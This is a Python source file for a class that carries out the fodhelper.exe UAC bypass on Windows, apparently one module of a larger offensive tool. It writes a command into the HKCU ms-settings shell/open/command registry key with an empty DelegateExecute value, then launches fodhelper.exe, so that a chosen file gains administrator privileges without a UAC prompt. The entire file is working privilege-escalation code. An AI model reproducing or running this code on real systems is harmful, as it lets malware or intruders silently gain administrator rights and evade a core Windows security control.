import os
import sys
import ctypes
from winreg import *
from utilities import utility

class uac_bypass:
    util = utility()
    
    PYTHON = "python"
    REGISTRY_NAME = "DelegateExecute"
    CMD_PATH = r"C:\Windows\System32\cmd.exe"
    FOD_HELPER = r"C:\Windows\System32\fodhelper.exe"   #This executable contains auto-elevation settings inside (Signed by Microsoft), which means the UAC prompt won't show up
    REGISTRY_PATH = "Software\Classes\ms-settings\shell\open\command"
    
    def __init__(self, target:str):
        #Find the full path of the executed file
        if self.util.is_running_as_exe():
            self.current_path = sys.executable
        else:
            self.current_path = os.path.abspath(__file__)
        
        #File we want to give administrator privileges
        if (os.path.exists(target)):
            self.target_file = target
        else:
            self.target_file = self.current_path

    def is_running_as_admin(self):
        """Do we have administrator privileges?"""
        
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception as e:
            print(e)
            return False
    
    def bypass_uac(self, cmd):
        """When fodhelper.exe is executed, it's looking for aditional commands to be executed with administrator privileges
        on the two registries (REGISTRY_PATH\Default and REGISTRY_PATH\REGISTRY_NAME)"""
        
        try:
            #Adding ourself to the registries
            self.util.create_reg_key(HKEY_CURRENT_USER, self.REGISTRY_PATH, self.REGISTRY_NAME, '')
            self.util.create_reg_key(HKEY_CURRENT_USER, self.REGISTRY_PATH, None, cmd)    
        except Exception as e:
            print(e)

    def can_bypass(self):
        """Actuall UAC bypass"""
        
        if self.is_running_as_admin():  #Do we already have admin rights?
            return 1
        else:
            try:
                if self.current_path == sys.executable:
                    command = "{} /k \"{}\"".format(self.CMD_PATH, self.target_file)    #Current files is executable
                else:
                    command = "{} /k {} \"{}\"".format(self.CMD_PATH, self.PYTHON, self.target_file)        #Current file is a .py
                
                self.bypass_uac(command)    #Write the command to the registries
                self.util.run_cmd_command(self.FOD_HELPER)  #Execute the fodhelper.exe
                
                sys.exit(0)     #Close ourselves
            except WindowsError:
                sys.exit(1)